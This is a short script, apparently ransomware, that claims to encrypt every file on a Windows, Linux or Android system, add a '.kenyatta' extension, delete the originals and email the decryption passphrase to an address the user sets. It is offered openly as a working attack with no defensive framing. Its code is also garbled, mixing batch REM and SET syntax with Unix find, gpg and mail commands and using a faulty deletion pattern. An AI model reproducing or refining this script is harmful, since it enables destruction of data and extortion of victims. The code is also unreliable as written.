REM This script encrypts all files on a Windows, Linux, or Android system, appends ".kenyatta" to the encrypted files, and generates a random decryption key that is sent to an email address.

REM Change the value of the "email_address" variable to your desired email address
SET email_address "you@example.com"

REM Generate a random passphrase
gpg --gen-random -a 0 20 > passphrase.txt

REM Read the passphrase from the file
SET /p passphrase=<passphrase.txt

REM Encrypt all files on the host
find / -type f -exec gpg --symmetric --passphrase %passphrase% --output "{}.kenyatta" "{}" \;

REM Delete the original unencrypted files
find / -type f -name "*[!kenyatta]" -delete

REM Send the passphrase to the specified email address
echo "The decryption key for the encrypted files is: %passphrase%" | mail -s "Decryption Key" %email_address%

REM Delete the passphrase file
DEL /Q /F passphrase.txt
